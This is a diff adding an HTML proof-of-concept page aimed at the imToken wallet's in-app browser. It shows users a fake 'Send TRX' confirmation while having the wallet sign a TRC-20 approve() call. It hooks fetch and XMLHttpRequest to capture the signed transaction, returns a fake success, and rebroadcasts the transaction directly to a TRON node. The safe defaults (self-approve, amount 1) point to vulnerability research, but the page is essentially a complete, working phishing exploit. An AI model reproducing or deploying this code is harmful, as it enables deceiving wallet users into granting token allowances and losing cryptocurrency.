@@ -1,0 +1,356 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TRON Mismatch PoC - Option A</title>
+    <style>
+      * { box-sizing: border-box; margin: 0; padding: 0; }
+      body { font-family: monospace; padding: 14px; font-size: 13px;
+             background: #0d0d0d; color: #e0e0e0; }
+      h2 { color: #ff4444; font-size: 15px; margin-bottom: 4px; }
+      .note { color: #555; font-size: 11px; margin-bottom: 12px; line-height: 1.5; }
+      label { display: block; margin: 8px 0 2px; color: #aaa; font-size: 12px; }
+      input { width: 100%; background: #1a1a1a; border: 1px solid #333;
+              color: #e0e0e0; padding: 5px 7px; border-radius: 3px;
+              font-family: monospace; font-size: 12px; }
+      /* ── fake wallet confirmation UI ── */
+      #fakeUI { display:none; margin-top:14px; background:#1c1c1e; border:1px solid #3a3a3c;
+                border-radius:12px; padding:16px; max-width:420px; }
+      #fakeUI .fu-title { color:#fff; font-size:14px; font-weight:bold; text-align:center; margin-bottom:4px; }
+      #fakeUI .fu-sub   { color:#8e8e93; font-size:11px; text-align:center; margin-bottom:14px; }
+      #fakeUI .fu-row   { display:flex; justify-content:space-between; padding:8px 0;
+                          border-bottom:1px solid #2c2c2e; font-size:12px; }
+      #fakeUI .fu-row:last-of-type { border:none; }
+      #fakeUI .fu-lbl { color:#8e8e93; }
+      #fakeUI .fu-val { color:#fff; text-align:right; max-width:65%; word-break:break-all; }
+      #fakeUI .fu-amount { color:#ff9f0a; font-size:22px; font-weight:bold;
+                           text-align:center; padding:10px 0; }
+      #confirmBtn { margin-top:14px; width:100%; padding:12px;
+                    background:#ff3b30; color:#fff; border:none;
+                    border-radius:10px; font-size:14px; font-weight:bold; cursor:pointer; }
+      #confirmBtn:disabled { background:#444; cursor:not-allowed; }
+      /* ── run button ── */
+      #runBtn { margin-top:12px; padding:8px 16px; background:#333; color:#aaa;
+                border:1px solid #444; border-radius:4px; cursor:pointer; font-size:12px; }
+      #runBtn:hover { background:#444; }
+      /* ── output panels ── */
+      .section { margin-top:12px; }
+      .tag { color:#ff9900; font-weight:bold; font-size:11px; text-transform:uppercase;
+             letter-spacing:.5px; margin-bottom:3px; }
+      pre { background:#111; border:1px solid #222; padding:8px; border-radius:4px;
+            overflow-x:auto; white-space:pre-wrap; word-break:break-all;
+            font-size:11.5px; min-height:16px; }
+      .ok  { color:#44ff88; }
+      .err { color:#ff4444; }
+      .warn { color:#ffaa00; }
+    </style>
+  </head>
+  <body>
+    <h2>TRON Mismatch PoC — Option A</h2>
+    <p class="note">
+      UI-level deception: page shows "Transfer TRX", wallet actually signs approve().<br>
+      Broadcast intercepted via fetch hook → re-sent directly to a real TRON full node.
+    </p>
+
+    <div id="config">
+      <label>TRC-20 token to approve (target contract)</label>
+      <input id="tokenContract" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" />
+
+      <label>Spender (defaults to current account = self-approve)</label>
+      <input id="spender" placeholder="defaults to current address" />
+
+      <label>Approve amount (token smallest unit — 1 = minimal)</label>
+      <input id="approveAmount" value="1" />
+
+      <label>RPC for building transactions</label>
+      <input id="rpcUrl" value="https://api.trongrid.io" />
+
+      <label>Direct broadcast URL (real TRON node, NOT token.im)</label>
+      <input id="broadcastUrl" value="https://api.trongrid.io/wallet/broadcasttransaction" />
+    </div>
+
+    <button id="runBtn">Preview fake UI</button>
+
+    <!-- ══ Fake wallet confirmation UI shown to user ══ -->
+    <div id="fakeUI">
+      <div class="fu-title">Send TRX</div>
+      <div class="fu-sub">Review the transaction details below</div>
+      <div class="fu-amount" id="fuAmount">0 TRX</div>
+      <div class="fu-row">
+        <span class="fu-lbl">From</span>
+        <span class="fu-val" id="fuFrom">–</span>
+      </div>
+      <div class="fu-row">
+        <span class="fu-lbl">To</span>
+        <span class="fu-val" id="fuTo">–</span>
+      </div>
+      <div class="fu-row">
+        <span class="fu-lbl">Network fee</span>
+        <span class="fu-val">≈ 0 TRX</span>
+      </div>
+      <div class="fu-row">
+        <span class="fu-lbl">Type</span>
+        <span class="fu-val">Transfer</span>
+      </div>
+      <button id="confirmBtn">Confirm</button>
+    </div>
+
+    <!-- ══ Output panels ══ -->
+    <div class="section">
+      <div class="tag">Status</div>
+      <pre id="status"></pre>
+    </div>
+    <div class="section">
+      <div class="tag">What Page Showed User (fake)</div>
+      <pre id="fakeDisplay"></pre>
+    </div>
+    <div class="section">
+      <div class="tag">Actual tx sent to wallet (approve)</div>
+      <pre id="approveTx"></pre>
+    </div>
+    <div class="section">
+      <div class="tag">Intercepted signed tx</div>
+      <pre id="signedTx"></pre>
+    </div>
+    <div class="section">
+      <div class="tag">Broadcast result (direct to TRON node)</div>
+      <pre id="broadcastResult"></pre>
+    </div>
+    <div class="section">
+      <div class="tag">Intercept log</div>
+      <pre id="interceptLog"></pre>
+    </div>
+
+    <script>
+      const $ = (id) => document.getElementById(id);
+      function j(v) { return JSON.stringify(v, null, 2); }
+      function setStatus(msg, cls) {
+        $('status').textContent = msg;
+        $('status').className = cls || '';
+      }
+
+      function rpc() {
+        return ($('rpcUrl').value.trim() || 'https://api.trongrid.io').replace(/\/$/, '');
+      }
+
+      function getAccount() {
+        const a = window.tronWeb?.defaultAddress?.base58;
+        if (!a || !a.startsWith('T')) {
+          throw new Error('No TRON account. Open this page inside imToken with a TRON wallet active.');
+        }
+        return a;
+      }
+
+      async function apiPost(url, body, fetchFn) {
+        const fn = fetchFn || window.fetch.bind(window);
+        const r = await fn(url, {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify(body),
+        });
+        if (!r.ok) { const t = await r.text().catch(() => ''); throw new Error(`HTTP ${r.status} ${url} ${t}`); }
+        return r.json();
+      }
+
+      async function buildApprove(from, spender) {
+        const spenderHex = window.tronWeb.address.toHex(spender).replace(/^41/, '').padStart(64, '0');
+        const amountHex  = BigInt($('approveAmount').value.trim() || '1').toString(16).padStart(64, '0');
+        const res = await apiPost(`${rpc()}/wallet/triggersmartcontract`, {
+          owner_address: from,
+          contract_address: $('tokenContract').value.trim(),
+          function_selector: 'approve(address,uint256)',
+          parameter: spenderHex + amountHex,
+          fee_limit: 100000000,
+          call_value: 0,
+          visible: true,
+        });
+        if (!res?.result?.result || !res?.transaction?.raw_data_hex)
+          throw new Error('triggersmartcontract failed: ' + j(res));
+        return res.transaction;
+      }
+
+      // ── Hook fetch + XHR; call tron.sendTransaction; capture signed broadcast ──
+      async function interceptAndSign(account, tx) {
+        const nativeFetch = window.fetch.bind(window);
+        const NativeXHR   = window.XMLHttpRequest;
+        const log = [];
+        let captured = null;
+
+        const isBroadcast = (u) => /broadcasttransaction/i.test(String(u));
+
+        const fakeSuccess = (body) =>
+          new Response(j({ result: true, txid: body.txID }),
+            { status: 200, headers: { 'content-type': 'application/json' } });
+
+        // fetch hook
+        window.fetch = async function(input, init = {}) {
+          const url = typeof input === 'string' ? input : (input?.url ?? String(input));
+          log.push('[fetch] ' + url);
+          if (isBroadcast(url)) {
+            try {
+              const body = JSON.parse(typeof init?.body === 'string' ? init.body : '{}');
+              if (body?.signature?.length) {
+                captured = body;
+                log.push('[fetch] ✓ captured signed tx, suppressing token.im broadcast');
+                return fakeSuccess(body);
+              }
+            } catch (_) {}
+          }
+          return nativeFetch(input, init);
+        };
+
+        // XHR hook
+        window.XMLHttpRequest = function InterceptedXHR() {
+          const xhr = new NativeXHR();
+          let _url = '';
+          const _open = NativeXHR.prototype.open.bind(xhr);
+          const _send = NativeXHR.prototype.send.bind(xhr);
+
+          xhr.open = function(m, u, ...rest) { _url = u; log.push('[xhr] ' + u); return _open(m, u, ...rest); };
+          xhr.send = function(body) {
+            if (isBroadcast(_url)) {
+              try {
+                const parsed = JSON.parse(typeof body === 'string' ? body : '{}');
+                if (parsed?.signature?.length) {
+                  captured = parsed;
+                  log.push('[xhr] ✓ captured signed tx, suppressing broadcast');
+                  const fake = j({ result: true, txid: parsed.txID });
+                  Object.defineProperty(xhr, 'readyState',   { get: () => 4 });
+                  Object.defineProperty(xhr, 'status',       { get: () => 200 });
+                  Object.defineProperty(xhr, 'responseText', { get: () => fake });
+                  Object.defineProperty(xhr, 'response',     { get: () => fake });
+                  setTimeout(() => {
+                    xhr.onreadystatechange?.();
+                    xhr.onload?.(new Event('load'));
+                    xhr.dispatchEvent(new Event('load'));
+                    xhr.dispatchEvent(new Event('loadend'));
+                  }, 0);
+                  return;
+                }
+              } catch (_) {}
+            }
+            return _send(body);
+          };
+          return xhr;
+        };
+        window.XMLHttpRequest.prototype = NativeXHR.prototype;
+
+        try {
+          if (typeof window.imToken?.callPromisifyAPI !== 'function')
+            throw new Error('window.imToken.callPromisifyAPI not available — must run inside imToken.');
+
+          await window.imToken.callPromisifyAPI('tron.sendTransaction', {
+            from: account,
+            tx,
+            useTronHeader: true,
+          });
+        } finally {
+          window.fetch          = nativeFetch;
+          window.XMLHttpRequest = NativeXHR;
+        }
+
+        return { captured, log, nativeFetch };
+      }
+
+      // ── Step 1: Preview the fake UI ──────────────────────────────────────────
+      async function previewFakeUI() {
+        try {
+          const account = getAccount();
+          // Show a fake "Send TRX" dialog
+          $('fuFrom').textContent   = account;
+          $('fuTo').textContent     = $('spender').value.trim() || account;
+          $('fuAmount').textContent = '10,000 TRX';
+          $('fakeDisplay').textContent = j({
+            displayed_type:   'Transfer',
+            displayed_amount: '10000 TRX',
+            displayed_to:     $('spender').value.trim() || account,
+            actual_type:      'TRC-20 approve()',
+            actual_contract:  $('tokenContract').value.trim(),
+          });
+          $('fakeUI').style.display = 'block';
+          setStatus('Fake "Send TRX" UI shown. Click Confirm below to actually submit approve().', 'warn');
+        } catch (e) {
+          setStatus('Error: ' + e.message, 'err');
+        }
+      }
+
+      // ── Step 2: User clicks Confirm → build approve, intercept, re-broadcast ─
+      async function runApprove() {
+        $('confirmBtn').disabled = true;
+        $('signedTx').textContent = '';
+        $('broadcastResult').textContent = '';
+        $('interceptLog').textContent = '';
+        $('approveTx').textContent = '';
+
+        try {
+          const account = getAccount();
+          const spender = $('spender').value.trim() || account;
+
+          setStatus('Building approve tx…');
+          const approveTx = await buildApprove(account, spender);
+          const approveData = approveTx.raw_data.contract[0].parameter.value.data ?? '';
+          $('approveTx').textContent = j({
+            txID:         approveTx.txID,
+            selector:     approveData.slice(0, 8),
+            approve_data: approveData,
+            raw_data_hex: approveTx.raw_data_hex,
+          });
+
+          if (approveData.slice(0, 8).toLowerCase() !== '095ea7b3')
+            throw new Error('Unexpected function selector: ' + approveData.slice(0, 8));
+
+          // The tx sent to imToken is the REAL approve (consistent raw_data + raw_data_hex).
+          // Deception was entirely in the HTML display above.
+          setStatus('Waiting for wallet confirmation… (imToken will show approve details)');
+          const { captured, log, nativeFetch } = await interceptAndSign(account, approveTx);
+
+          $('interceptLog').textContent = log.join('\n');
+
+          if (!captured) {
+            throw new Error(
+              'Broadcast NOT intercepted via JS fetch/XHR.\n' +
+              'imToken may broadcast natively (iOS NSURLSession).\n' +
+              'Use a MITM proxy to capture the POST body to broadcasttransaction,\n' +
+              'then replay it to api.trongrid.io manually.'
+            );
+          }
+
+          $('signedTx').textContent = j({ txID: captured.txID, signature: captured.signature });
+
+          setStatus('Broadcasting captured tx directly to TRON full node…');
+          const broadcastUrl = $('broadcastUrl').value.trim();
+          const result = await apiPost(broadcastUrl, captured, nativeFetch);
+          $('broadcastResult').textContent = j(result);
+
+          if (result.result === true) {
+            $('fakeUI').style.display = 'none';
+            setStatus(
+              [
+                '✓ SUCCESS',
+                '',
+                'Page showed user:  Transfer 10000 TRX to ' + spender,
+                'Actually executed: approve(' + spender + ', ' + $('approveAmount').value.trim() + ')',
+                'Token contract:    ' + $('tokenContract').value.trim(),
+                'approve txID:      ' + captured.txID,
+                '',
+                'Broadcast bypassed token.im middleware → sent directly to api.trongrid.io',
+              ].join('\n'),
+              'ok'
+            );
+          } else {
+            setStatus('Broadcast returned non-success:\n' + j(result), 'err');
+          }
+        } catch (e) {
+          console.error(e);
+          setStatus('Error: ' + (e.message || String(e)), 'err');
+        } finally {
+          $('confirmBtn').disabled = false;
+        }
+      }
+
+      $('runBtn').addEventListener('click', previewFakeUI);
+      $('confirmBtn').addEventListener('click', runApprove);
+    </script>
+  </body>
+</html>
